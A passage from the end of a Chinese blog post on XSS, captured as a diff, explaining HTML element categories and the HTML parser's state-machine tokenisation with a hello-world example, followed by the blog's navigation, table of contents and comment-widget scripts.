+<li>原始文本元素(Raw text elements) 有&lt;script&gt;和&lt;style&gt;</li>
+<li>RCDATA元素(RCDATA elements) 有&lt;textarea&gt;和&lt;title&gt;</li>
+<li>外部元素(Foreign elements) 例如mathml命名空间或者svg命名空间的元素</li>
+<li>基本元素(normal elements) 即除了以上四种元素以外的元素</li>
+</ol>
+<p>五类元素的区别</p>
+<ol>
+<li>空元素,不能容纳任何内容(因为他们没有闭合标签,没有内容能够放在开始标签和闭合标签中间)</li>
+<li>原始文本元素,可以容纳文本</li>
+<li>RCDATA元素,可以容纳文本和字符引用</li>
+<li>外部元素,可以容纳文本 字符引用CDTATA段 其他元素和注释</li>
+<li>基本元素,可以容纳文本 字符引用 其他元素和注释</li>
+</ol>
+<p>html解析器以状态机的方式运行,它从文档输入流中消耗字符并根据其转换规则转换到不同的状态</p>
+<p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220415224659355.png" alt="image-20220415224659355"></p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">   Hello world</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<ol>
+<li>初始状态为 data state, 当遇到 &lt; 字符 ,状态变为 tag open state ,读取一个a-z的字符将产生一个开始标签符号,状态相应变为, tag name state 一直保持这个状态直到读取到了 &gt;, 每一个字符都附加到这个符号名上,例子中创建的是一个html符号</li>
+<li>当读取到&gt; 当前的符号就完成了,此时,状态回到了datastate, &lt;body&gt;重复这一处理过程.到这里,html和body标签都识别出来了.现在,回到data state,读取hellowrld中的字符h将创建</li>
+</ol>
+<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA">https://mp.weixin.qq.com/s/liODgY4NjYqdWg3JgPXMdA</a></p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/XSS/">XSS</a><a class="post-meta__tags" href="/tags/%E9%9D%B6%E5%9C%BA/">靶场</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2018/05/12/17/41/forest-3394066_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/vulnhub/vulnhub/vulnhub%E9%9D%B6%E5%9C%BA/"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">LordOfTheRoot_1.0.1</div></div></a></div><div class="next-post pull-right"><a href="/%E5%85%B6%E4%BB%96/%E5%85%B6%E4%BB%96/burp%E6%8F%92%E4%BB%B6/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2014/11/15/23/31/alpsee-532864_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Burp插件</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/ctf-show/ctf.show/XSS/" title="XSS"><img class="cover" src="https://cdn.pixabay.com/photo/2016/11/25/23/15/moon-1859616_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-17</div><div class="title">XSS</div></div></a></div><div><a href="/vulnhub/vulnhub/vulnhub%E9%9D%B6%E5%9C%BA/" title="LordOfTheRoot_1.0.1"><img class="cover" src="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-30</div><div class="title">LordOfTheRoot_1.0.1</div></div></a></div><div><a href="/%E5%86%85%E7%BD%91/%E5%86%85%E7%BD%91/ATT&CK(%E4%B8%80)/" title="ATT&amp;CK(一)"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-08-30</div><div class="title">ATT&amp;CK(一)</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#XSStrike"><span class="toc-number">1.</span> <span class="toc-text">XSStrike</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#XSSlabs%E9%9D%B6%E5%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">XSSlabs靶场</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#payload"><span class="toc-number">2.1.</span> <span class="toc-text">payload</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4xss"><span class="toc-number">2.2.</span> <span class="toc-text">无过滤xss</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%97%AD%E5%90%88input%E5%B1%9E%E6%80%A7"><span class="toc-number">2.3.</span> <span class="toc-text">闭合input属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7"><span class="toc-number">2.4.</span> <span class="toc-text">input标签属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#input%E6%A0%87%E7%AD%BE%E5%B1%9E%E6%80%A7-1"><span class="toc-number">2.5.</span> <span class="toc-text">input标签属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#herf%E5%B1%9E%E6%80%A7"><span class="toc-number">2.6.</span> <span class="toc-text">herf属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.7.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.8.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#html%E7%BC%96%E7%A0%81"><span class="toc-number">2.9.</span> <span class="toc-text">html编码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A0%BC%E5%BC%8F%E5%88%A4%E6%96%AD"><span class="toc-number">2.10.</span> <span class="toc-text">格式判断</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#hidden%E5%B1%9E%E6%80%A7"><span class="toc-number">2.11.</span> <span class="toc-text">hidden属性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reffer%E6%9E%84%E9%80%A0"><span class="toc-number">2.12.</span> <span class="toc-text">reffer构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ua%E6%9E%84%E9%80%A0"><span class="toc-number">2.13.</span> <span class="toc-text">ua构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cookie%E6%9E%84%E9%80%A0"><span class="toc-number">2.14.</span> <span class="toc-text">cookie构造</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#xss%E9%9D%B6%E5%9C%BA%E7%BB%83%E4%B9%A0xss-haozi-me"><span class="toc-number">3.</span> <span class="toc-text">xss靶场练习xss.haozi.me</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4%E5%9C%A8div%E4%B9%8B%E9%97%B4"><span class="toc-number">3.1.</span> <span class="toc-text">无过滤在div之间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4%E5%9C%A8textarea%E4%B9%8B%E9%97%B4"><span class="toc-number">3.2.</span> <span class="toc-text">无过滤在textarea之间</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A0%E8%BF%87%E6%BB%A4%E6%B3%A8%E5%85%A5%E5%9C%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%86%85"><span class="toc-number">3.3.</span> <span class="toc-text">无过滤注入在字符串内</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4-%E6%8B%AC%E5%8F%B7%E5%92%8C%E6%96%B9%E6%8B%AC%E5%8F%B7"><span class="toc-number">3.4.</span> <span class="toc-text">过滤([])括号和方括号</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E7%A0%81%E6%B7%B1%E5%85%A5xss%E7%BB%95%E8%BF%87"><span class="toc-number">4.</span> <span class="toc-text">通过浏览器编码深入xss绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">4.1.</span> <span class="toc-text">基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#html%E7%BC%96%E7%A0%81-%E5%AD%97%E7%AC%A6%E5%AE%9E%E4%BD%93"><span class="toc-number">4.1.1.</span> <span class="toc-text">html编码(字符实体)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#javascript%E7%BC%96%E7%A0%81"><span class="toc-number">4.1.2.</span> <span class="toc-text">javascript编码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#url%E7%BC%96%E7%A0%81"><span class="toc-number">4.1.3.</span> <span class="toc-text">url编码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81%E8%A7%84%E5%88%99"><span class="toc-number">4.2.</span> <span class="toc-text">浏览器编码解码规则</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#html%E8%A7%A3%E6%9E%90%E5%99%A8"><span class="toc-number">4.3.</span> <span class="toc-text">html解析器</span></a></li></ol></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
+  if (typeof pangu === 'object') pangu.autoSpacingPage()
+  else {
+    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
+      .then(() => {
+        pangu.autoSpacingPage()
+      })
+  }
+}
+
+function panguInit () {
+  if (false){
+    GLOBAL_CONFIG_SITE.isPost && panguFn()
+  } else {
+    panguFn()
+  }
+}
+
+document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    const valine = new Valine(Object.assign({
+      el: '#vcomment',
+      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
+      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
+      avatar: 'monsterid',
+      serverURLs: 'https://valine.wanan.red',
+      emojiMaps: "",
+      path: window.location.pathname,
+      visitor: false
+    }, null))
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+  else setTimeout(loadValine, 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script><script>function loadDisqus () {
+  var disqus_config = function () {
+    this.page.url = 'https://www.wanan.red/XSS/XSS/XSS/'
+    this.page.identifier = '/XSS/XSS/XSS/'
+    this.page.title = 'XSS'
+  };
+
+  window.disqusReset = () => {
+    DISQUS.reset({
+      reload: true,
+      config: disqus_config
+    })
+  }
+
+  if (window.DISQUS) disqusReset()
+  else {
+    (function() { 
+      var d = document, s = d.createElement('script');
+      s.src = 'https://www-wanan-red.disqus.com/embed.js';
+      s.setAttribute('data-timestamp', +new Date());
+      (d.head || d.body).appendChild(s);
+    })();
+  }
+
+  document.getElementById('darkmode').addEventListener('click', () => {
+    setTimeout(() => window.disqusReset(), 200)
+  })
+}
+
+if ('Valine' === 'Disqus' || !false) {
+  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
+  else loadDisqus()
+} else {
+  function loadOtherComment () {
+    loadDisqus()
+  }
+}
+</script></div><script>(function(d, w, c) {
+    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (false) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
